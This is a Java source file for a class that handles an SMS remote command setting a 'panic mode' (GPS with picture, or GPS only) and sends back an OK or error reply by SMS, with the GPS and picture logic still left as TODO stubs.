package com.vvt.rmtcmd.sms;

import com.vvt.rmtcmd.RmtCmdLine;
import com.vvt.rmtcmd.SetPanicModeCmdLine;
import com.vvt.rmtcmd.command.PanicMode;
import com.vvt.rmtcmd.resource.RmtCmdTextResource;
import com.vvt.smsutil.FxSMSMessage;
import com.vvt.std.Constant;
import com.vvt.std.Log;

public class SMSSetPanicMode extends RmtCmdSync {
	
	public SMSSetPanicMode(RmtCmdLine rmtCmdLine) {
		super.rmtCmdLine = rmtCmdLine;
		smsMessage.setNumber(rmtCmdLine.getSenderNumber());
	}

	// RmtCommand
	public void execute(RmtCmdExecutionListener observer) {
		smsSender.addListener(this);
		super.observer = observer;
		doSMSHeader(smsCmdCode.getPanicModeCmd());
		try {
			SetPanicModeCmdLine panicModeCmd = (SetPanicModeCmdLine) rmtCmdLine;
			// TODO: Add logic for panic mode GPS and picture. 
			String replyMsg = RmtCmdTextResource.PANIC_MODE_GPS_PICTURE;
			int mode = panicModeCmd.getPanicMode();
			if (mode == PanicMode.GPS_PICTURE.getId()) {
				replyMsg = RmtCmdTextResource.PANIC_MODE_GPS_PICTURE;
			} else if (mode == PanicMode.GPS_ONLY.getId()) {
				// TODO: Add logic for panic mode GPS only.
				replyMsg = RmtCmdTextResource.PANIC_MODE_GPS_ONLY;
			} else {
				// Wrong panic mode (should not come here!)
				replyMsg = RmtCmdTextResource.INV_CMD_FORMAT;
				throw new IllegalArgumentException(replyMsg);
			}
			responseMessage.append(Constant.OK);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(replyMsg);
			
		} catch(Exception e) {
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
		}
		// To create system event.
		createSystemEventOut(responseMessage.toString());
		// To send SMS reply.
		smsMessage.setMessage(responseMessage.toString());
		send();
	}

	// SMSSendListener
	public void smsSendFailed(FxSMSMessage smsMessage, Exception e, String message) {
		Log.error("SMSSetPanicModeCmd.smsSendFailed", "Number = " + smsMessage.getNumber() + ", SMS Message = " + smsMessage.getMessage() + ", Contact Name = " + smsMessage.getContactName() + ", Message = " + message, e);
		smsSender.removeListener(this);
		observer.cmdExecutedError(this);
	}

	public void smsSendSuccess(FxSMSMessage smsMessage) {
		smsSender.removeListener(this);
		observer.cmdExecutedSuccess(this);
	}
}
